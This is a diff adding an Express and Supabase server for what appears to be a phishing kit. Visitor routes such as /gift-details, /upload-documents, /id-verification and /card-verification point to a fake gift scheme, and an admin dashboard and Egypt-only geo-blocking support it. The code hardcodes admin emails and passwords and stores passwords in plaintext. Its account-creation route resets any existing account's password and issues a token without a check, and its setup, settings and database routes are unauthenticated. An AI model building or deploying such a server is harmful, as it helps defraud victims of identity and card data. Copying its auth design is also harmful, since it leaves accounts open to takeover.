+    const key = await rtdbPush(req.body.path, req.body.value);
+    res.json({ key });
+  } catch (e) {
+    console.error('fb/push error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/fb/remove', async (req, res) => {
+  try {
+    await rtdbRemove(req.body.path);
+    res.json({ ok: true });
+  } catch (e) {
+    console.error('fb/remove error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ── Auth API (replaces Firebase Auth) ───────────────────────
+
+const authTokens = new Map();
+
+app.post('/api/auth/signin', async (req, res) => {
+  try {
+    const { email, password } = req.body;
+    if (!email || !password) return res.status(400).json({ error: 'missing fields' });
+    const key = email.trim().toLowerCase().replace(/[.#$\[\]]/g, '_');
+    const { data: row, error } = await supabase.from('dashboard_accounts').select('*').eq('id', key).single();
+
+    if (error || !row) return res.status(401).json({ code: 'auth/user-not-found', message: 'User not found' });
+    if (row.status === 'inactive') return res.status(401).json({ code: 'auth/user-disabled', message: 'Account disabled' });
+    if (row.password !== password) return res.status(401).json({ code: 'auth/wrong-password', message: 'Wrong password' });
+
+    const uid = key;
+    const token = crypto.randomBytes(32).toString('hex');
+    authTokens.set(token, { uid, email: email.trim().toLowerCase() });
+    res.json({ uid, email: email.trim().toLowerCase(), token, claims: { role: row.role } });
+  } catch (e) {
+    console.error('auth/signin error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/auth/create', async (req, res) => {
+  try {
+    const { email, password } = req.body;
+    if (!email || !password) return res.status(400).json({ error: 'missing fields' });
+    const key = email.trim().toLowerCase().replace(/[.#$\[\]]/g, '_');
+    const { data: existing } = await supabase.from('dashboard_accounts').select('*').eq('id', key).single();
+
+    if (existing) {
+      if (existing.password !== password) {
+        await supabase.from('dashboard_accounts').update({ password }).eq('id', key);
+      }
+      const token = crypto.randomBytes(32).toString('hex');
+      authTokens.set(token, { uid: key, email: email.trim().toLowerCase() });
+      return res.json({ uid: key, email: email.trim().toLowerCase(), token, existing: true, claims: { role: existing.role } });
+    }
+
+    const uid = key;
+    const token = crypto.randomBytes(32).toString('hex');
+    authTokens.set(token, { uid, email: email.trim().toLowerCase() });
+    res.json({ uid, email: email.trim().toLowerCase(), token });
+  } catch (e) {
+    if (e.message?.includes('already-in-use')) {
+      return res.status(409).json({ code: 'auth/email-already-in-use', message: 'Email already in use' });
+    }
+    console.error('auth/create error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/auth/signout', (req, res) => {
+  const token = (req.headers.authorization || '').replace('Bearer ', '');
+  if (token) authTokens.delete(token);
+  res.json({ ok: true });
+});
+
+app.get('/api/auth/state', (req, res) => {
+  const token = (req.headers.authorization || '').replace('Bearer ', '');
+  const user = authTokens.get(token);
+  if (user) return res.json({ uid: user.uid, email: user.email });
+  res.json({ uid: null, email: null });
+});
+
+// ── Settings API (for geo-blocking) ─────────────────────────
+
+app.get(['/api/settings/:key.json', '/settings/:key.json'], async (req, res) => {
+  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  res.set('Pragma', 'no-cache');
+  res.set('Expires', '0');
+  try {
+    const { data, error } = await supabase.from('settings').select('value').eq('key', req.params.key).single();
+    res.json(data?.value || null);
+  } catch (e) {
+    res.json(null);
+  }
+});
+
+app.put(['/api/settings/:key.json', '/settings/:key.json'], async (req, res) => {
+  try {
+    const key = req.params.key;
+    const newFields = req.body;
+    const { data: existing } = await supabase.from('settings').select('value').eq('key', key).single();
+    const merged = { ...(existing?.value || {}), ...newFields };
+    await supabase.from('settings').upsert({ key, value: merged }, { onConflict: 'key' });
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ── Setup endpoint ────────────────────────────────────────────
+
+app.post('/api/setup', async (req, res) => {
+  try {
+    const admins = [
+      { id: 'ash@gmail_com', email: 'ash@gmail.com', password: 'Ha1234@@', role: 'superadmin', name: 'المدير العام الأعلى' },
+      { id: 'jafar@admin_com', email: 'jafar@admin.com', password: '112233', role: 'admin', name: 'جعفر' },
+      { id: 'superadmin@admin_com', email: 'superadmin@admin.com', password: 'superadmin12345', role: 'superadmin', name: 'مدير النظام' }
+    ];
+    for (const a of admins) {
+      await supabase.from('dashboard_accounts').upsert({ ...a, status: 'active' }, { onConflict: 'id' });
+    }
+    await supabase.from('settings').upsert({ key: 'geoBlocking', value: { enabled: true, allowedCountries: ['EG'] } }, { onConflict: 'key' });
+    res.json({ ok: true, seeded: admins.length + 1 });
+  } catch (e) {
+    console.error('setup error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ── Admin auth ──────────────────────────────────────────────
+
+app.post('/api/admin/login', async (req, res) => {
+  try {
+    const { password } = req.body;
+    if (password === ADMIN_PASS) return res.json({ ok: true });
+    res.status(401).json({ error: 'wrong password' });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ── Polling endpoint for real-time simulation ───────────────
+
+app.get('/api/fb/poll', async (req, res) => {
+  try {
+    const p = normPath(req.query.path);
+    const val = await rtdbRead(p);
+    res.json({ value: val });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ── Migration: ensure data columns exist ────────────────────
+app.post('/api/migrate', async (req, res) => {
+  try {
+    const { Pool } = require('pg');
+    const connStr = process.env.DATABASE_URL || `${SUPABASE_URL.replace('https://', 'postgresql://postgres:' + encodeURIComponent(process.env.SUPABASE_DB_PASS || '') + '@db.')}/postgres`;
+    const pool = new Pool({ connectionString: connStr, ssl: { rejectUnauthorized: false } });
+    const migrations = [
+      `ALTER TABLE dashboard_accounts ADD COLUMN IF NOT EXISTS data jsonb DEFAULT '{}'::jsonb`,
+      `ALTER TABLE customer_events DROP CONSTRAINT IF EXISTS customer_events_customer_id_fkey`
+    ];
+    const results = [];
+    for (const sql of migrations) {
+      try {
+        await pool.query(sql);
+        results.push({ sql: sql.substring(0, 60), ok: true });
+      } catch (e) {
+        results.push({ sql: sql.substring(0, 60), error: e.message });
+      }
+    }
+    await pool.end();
+    res.json({ ok: true, results });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// ── SPA rewrites (visitor routes → Nuxt SPA) ─────────────────
+const spaRoutes = ['/login', '/watches', '/watch-selection', '/delivery', '/claim',
+  '/shipping', '/gift-details', '/documents', '/verify-identity', '/upload-documents',
+  '/verify-docs', '/id-verification', '/card-verification', '/waiting', '/success',
+  '/call', '/blocked', '/activate-token', '/verify-bot-security-check'];
+
+spaRoutes.forEach(route => {
+  app.get(route, (req, res) => {
+    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
+    res.sendFile(path.join(__dirname, 'admin', 'index.html'));
+  });
+});
+
+// ── Static files ────────────────────────────────────────────
+
+app.use(express.static(path.join(__dirname), {
+  extensions: ['html'],
+  index: 'index.html'
+}));
+
+app.get('*', (req, res) => {
+  const reqPath = req.path;
+  if (reqPath.startsWith('/api/')) return res.status(404).json({ error: 'not found' });
+
+  const cleanPath = reqPath.replace(/\/$/, '');
+  const candidates = [
+    path.join(__dirname, cleanPath + '.html'),
+    path.join(__dirname, cleanPath, 'index.html'),
+    path.join(__dirname, 'admin', 'index.html')
+  ];
+  for (const c of candidates) {
+    try {
+      if (require('fs').existsSync(c)) return res.sendFile(c);
+    } catch {}
+  }
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+
+module.exports = app;
